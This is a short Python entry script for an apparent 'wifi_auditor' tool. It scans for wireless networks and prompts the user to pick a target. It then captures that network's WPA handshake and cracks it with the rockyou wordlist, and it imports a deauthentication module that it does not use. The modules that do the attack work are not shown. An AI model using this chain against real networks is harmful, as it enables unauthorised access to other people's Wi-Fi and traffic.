# === wifi_auditor/main.py ===
from scanner import scan_networks
from handshake_capture import capture_handshake
from deauth_attack import deauth_target
from cracker import crack_handshake


def main():
    interface = "wlan0mon"  # Default monitor-mode interface

    print("[+] Scanning Wi-Fi networks...")
    networks = scan_networks(interface)

    if not networks:
        print("[-] No networks found.")
        return

    print("\n[+] Select target network:")
    for idx, net in enumerate(networks):
        print(f"{idx}. SSID: {net['ssid']}, BSSID: {net['bssid']}, Channel: {net['channel']}")

    choice = int(input("Enter the number of the target network: "))
    target = networks[choice]

    print(f"[+] Target selected: {target['ssid']} ({target['bssid']})")

    capture_handshake(interface, target['bssid'])
    crack_handshake(target['bssid'], "captures/handshake.pcap", "wordlists/rockyou.txt")


if __name__ == "__main__":
    main()
